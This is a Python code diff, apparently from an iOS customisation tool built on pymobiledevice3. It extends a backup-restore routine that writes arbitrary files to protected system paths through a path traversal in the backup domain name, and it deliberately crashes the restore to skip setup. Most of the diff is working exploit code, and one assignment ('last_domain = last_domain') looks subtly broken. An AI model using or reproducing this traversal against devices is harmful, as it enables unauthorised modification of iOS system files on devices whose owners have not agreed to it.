@@ -3,11 +3,78 @@ from pymobiledevice3.lockdown import LockdownClient
 import os
 
 class FileToRestore:
-    def __init__(self, contents: str, restore_path: str, owner: int = 501, group: int = 501):
+    def __init__(self, contents: str, restore_path: str, domain: str = None, owner: int = 501, group: int = 501):
         self.contents = contents
         self.restore_path = restore_path
+        self.domain = domain
         self.owner = owner
         self.group = group
+
+def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str) -> str:
+    base_path = "/var/backup"
+    # set it to work in the separate volumes (prevents a bootloop)
+    if file.restore_path.startswith("/var/mobile/"):
+        # required on iOS 17.0+ since /var/mobile is on a separate partition
+        base_path = "/var/mobile/backup"
+    elif file.restore_path.startswith("/private/var/mobile/"):
+        base_path = "/private/var/mobile/backup"
+    elif file.restore_path.startswith("/private/var/"):
+        base_path = "/private/var/backup"
+    # don't append the directory if it has already been added (restore will fail)
+    path, name = os.path.split(file.restore_path)
+    domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
+    if last_domain != domain_path:
+        files_list.append(backup.Directory(
+            "",
+            f"{domain_path}/",
+            owner=file.owner,
+            group=file.group
+        ))
+        last_domain = domain_path
+    files_list.append(backup.ConcreteFile(
+        "",
+        f"{domain_path}/{name}",
+        owner=file.owner,
+        group=file.group,
+        contents=file.contents
+    ))
+    return last_domain
+
+def concat_regular_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str, last_path: str) -> str:
+    path, name = os.path.split(file.restore_path)
+    paths = path.split("/")
+    # append the domain first
+    if last_domain != file.domain:
+        files_list.append(backup.Directory(
+            "",
+            file.domain,
+            owner=file.owner,
+            group=file.group
+        ))
+        last_domain = last_domain
+    # append each part of the path if it is not already there
+    full_path = ""
+    for path_item in paths:
+        if full_path != "":
+            full_path += "/"
+        full_path += path_item
+        if not last_path.startswith(full_path):
+            files_list.append(backup.Directory(
+                full_path,
+                last_domain,
+                owner=file.owner,
+                group=file.group
+            ))
+            last_path = full_path
+    # finally, append the file
+    files_list.append(backup.ConcreteFile(
+        full_path,
+        last_domain,
+        owner=file.owner,
+        group=file.group,
+        contents=file.contents
+    ))
+    return last_domain, last_path
 
 # files is a list of FileToRestore objects
 def restore_files(files: list, reboot: bool = False, lockdown_client: LockdownClient = None):
@@ -17,35 +84,18 @@ def restore_files(files: list, reboot: bool = False, lockdown_client: LockdownCl
     sorted_files = sorted(files, key=lambda x: x.restore_path, reverse=True)
     # add the file paths
     last_domain = ""
+    last_path = ""
+    exploit_only = True
     for file in sorted_files:
-        base_path = "/var/backup"
-        # set it to work in the separate volumes (prevents a bootloop)
-        if file.restore_path.startswith("/var/mobile/"):
-            # required on iOS 17.0+ since /var/mobile is on a separate partition
-            base_path = "/var/mobile/backup"
-        elif file.restore_path.startswith("/private/var/mobile/"):
-            base_path = "/private/var/mobile/backup"
-        elif file.restore_path.startswith("/private/var/"):
-            base_path = "/private/var/backup"
-        # don't append the directory if it has already been added (restore will fail)
-        path, name = os.path.split(file.restore_path)
-        domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
-        if last_domain != domain_path:
-            files_list.append(backup.Directory(
-                "",
-                f"{domain_path}/",
-                owner=file.owner,
-                group=file.group
-            ))
-            last_domain = domain_path
-        files_list.append(backup.ConcreteFile(
-            "",
-            f"{domain_path}/{name}",
-            owner=file.owner,
-            group=file.group,
-            contents=file.contents
-        ))
-    files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))
+        if file.domain == None:
+            last_domain = concat_exploit_file(file, files_list, last_domain)
+        else:
+            last_domain, last_path = concat_regular_file(file, files_list, last_domain, last_path)
+            exploit_only = False
+
+    # crash the restore to skip the setup (only works for exploit files)
+    if exploit_only:
+        files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))
 
     # create the backup
     back = backup.Backup(files=files_list)
@@ -53,6 +103,7 @@ def restore_files(files: list, reboot: bool = False, lockdown_client: LockdownCl
     perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client)
 
 
+# DEPRICATED
 def restore_file(fp: str, restore_path: str, restore_name: str, reboot: bool = False, lockdown_client: LockdownClient = None):
     # open the file and read the contents
     contents = open(fp, "rb").read()
